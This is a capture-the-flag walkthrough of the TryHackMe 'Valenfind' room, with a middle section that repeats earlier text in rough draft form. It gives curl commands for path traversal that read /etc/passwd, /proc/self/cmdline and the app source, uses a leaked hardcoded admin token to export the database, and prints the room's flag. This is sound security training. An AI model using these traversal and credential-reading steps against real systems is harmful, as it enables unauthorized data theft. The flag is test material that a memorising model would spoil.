# Valenfind TryHackMe Walkthrough

https://tryhackme.com/room/lafb2026e10

## Initial Reconnaissance

<img width="924" height="717" alt="image" src="https://github.com/user-attachments/assets/15436140-b246-4e5c-b5dc-e367e8b2cd88" />

The room already provided the web application URL, and I noticed that the application was running on port `5000`. I started by opening the website to see what functionality was available.

<img width="1891" height="531" alt="image" src="https://github.com/user-attachments/assets/e92b772a-f438-4054-840f-85444f2b5ab9" />

On the landing page, I clicked the **Start Journey** button. The application redirected me to a registration page, requiring a new account before accessing the platform.

<img width="1898" height="495" alt="image" src="https://github.com/user-attachments/assets/f1b5c8c2-8c50-4753-8fd3-814fab7a112a" />

After creating an account and logging in, I was taken to the dashboard. From there, I could see several user profiles that had already been created within the application.

<img width="1891" height="967" alt="image" src="https://github.com/user-attachments/assets/bc7329d3-2679-4e11-84b9-583461a73b34" />

While exploring the application, I found that I could like other users, view their profiles, and modify my own profile settings such as the bio and theme.

<img width="1917" height="745" alt="image" src="https://github.com/user-attachments/assets/72810aa9-4914-4604-9fa4-af9675d920b3" />

At first glance, everything appeared to be working normally. I tried sending a Valentine by clicking the available button, but I did not notice any interesting URL changes. To understand how the application was functioning behind the scenes, I opened the browser's developer tools and monitored the network traffic.

While changing the profile theme, I noticed a GET request being made to the following endpoint:

```
http://10.48.151.100:5000/api/fetch_layout?layout=theme_classic.html
```

<img width="1915" height="967" alt="image" src="https://github.com/user-attachments/assets/2d148320-a341-46a8-93e8-11adbdedefe8" />

The API appeared to be fetching layout templates based on the value supplied in the `layout` parameter. Since user input was being used to determine which file was loaded, I decided to test for a Local File Inclusion vulnerability by supplying path traversal sequences.

My first test targeted `/etc/passwd` using the payload `../../../../etc/passwd`. I sent the request directly from my terminal using curl. Since the application appeared to be heavily vibe-coded, I suspected that authentication checks might not be enforced on this endpoint. That assumption turned out to be correct, as the request worked without requiring any session cookie.

```
curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../etc/passwd
```

The response returned the contents of `/etc/passwd`, confirming that the endpoint was vulnerable to Local File Inclusion through path traversal.

<img width="933" height="862" alt="image" src="https://github.com/user-attachments/assets/cc0955c8-4b16-4622-bc4e-cc515641f5c0" />


--------------------
so we can like a person and view there profile and chnage profile bio theme

<img width="1917" height="745" alt="image" src="https://github.com/user-attachments/assets/72810aa9-4914-4604-9fa4-af9675d920b3" />

at first look everthing seem normal as i send valantine by clicking on button i dont see any url changes so i open the inspect and network and when i chnage the theem i notic get requret 
```
http://10.48.151.100:5000/api/fetch_layout?layout=theme_classic.html
```
<img width="1915" height="967" alt="image" src="https://github.com/user-attachments/assets/2d148320-a341-46a8-93e8-11adbdedefe8" />

the api is try to fetch the layout so i try lfi sent this API request of sent path traversal payloads.

First test was `/etc/passwd` with: `../../../../etc/passwd` with curl on terminal so i think it dosnt req session cookei as it vibe coded and im true 
it return me what i want 
```
curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../etc/passwd
```

<img width="933" height="862" alt="image" src="https://github.com/user-attachments/assets/cc0955c8-4b16-4622-bc4e-cc515641f5c0" />

-------------

Use /proc/self/cmdline to Find the App's Location
You have arbitrary file read, but you don’t know where the web application’s source code lives on the server. Here’s a Linux trick that solves that instantly.


The /proc filesystem is a virtual filesystem that exposes live information about running processes. /proc/self refers to the current process — in this case, the Python web server serving your requests. Inside it, cmdline contains the exact command used to launch the process.

```
$ curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../proc/self/cmdline -O 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    39  100    39    0     0    598      0 --:--:-- --:--:-- --:--:--   600
death@esther:~$ cat fetch_layout 
/usr/bin/python3/opt/Valenfind/app.py
```
we can do same things on burp if u prefer burp

<img width="1222" height="277" alt="image" src="https://github.com/user-attachments/assets/78751324-cd19-4c61-b504-feff06f16f9c" />

Why this matters: You’re asking the server “how were you started?” and it answers honestly, giving you the full path to the application’s entry point. Now you have a precise target for your next read.

The app lives at /opt/Valenfind/app.py.
```
curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
```

<img width="1086" height="562" alt="image" src="https://github.com/user-attachments/assets/ddbb9ed6-1c5b-4c1a-ac9a-41103fba7eb7" />

<img width="1521" height="530" alt="image" src="https://github.com/user-attachments/assets/a1efa4d3-7acd-416a-93bb-599a7dacc48b" />

The server returns the complete Python source code. Read it carefully. Near the top:
```
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE      = 'cupid.db'
```
Hardcoded. Right there. And further down, the admin export endpoint:
```
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True,
                             download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden",
                        "message": "Missing or Invalid Admin Token"}), 403
```
<img width="974" height="267" alt="image" src="https://github.com/user-attachments/assets/ad7225f9-dae5-437a-9aab-c79bcb25a74b" />

There’s an endpoint at /api/admin/export_db that downloads the entire database — but only if you send the correct X-Valentine-Token header. You now have exactly that token.

The real-world lesson: Hardcoding secrets in source code is a critical vulnerability. Once an attacker can read your code (via LFI, exposed repos, or misconfigured servers), all your internal secrets are exposed. Always use environment variables or a secrets manager.

## Download the Database and Extract the Flag
Use curl to call the export endpoint with the admin token:

```
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://MACHINE_IP:5000/api/admin/export_db \
     -o valenfind.db
```
Open it with sqlite3:
```
sqlite3 valenfind.db
sqlite> .tables
users
sqlite> SELECT * FROM users;
```

<img width="1905" height="576" alt="image" src="https://github.com/user-attachments/assets/23cea032-7ad3-4d48-986d-adcd0c9805b6" />

Flag
```
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```
<img width="849" height="386" alt="image" src="https://github.com/user-attachments/assets/45cce556-d9c6-4c69-bbee-a7f66b54dcb8" />

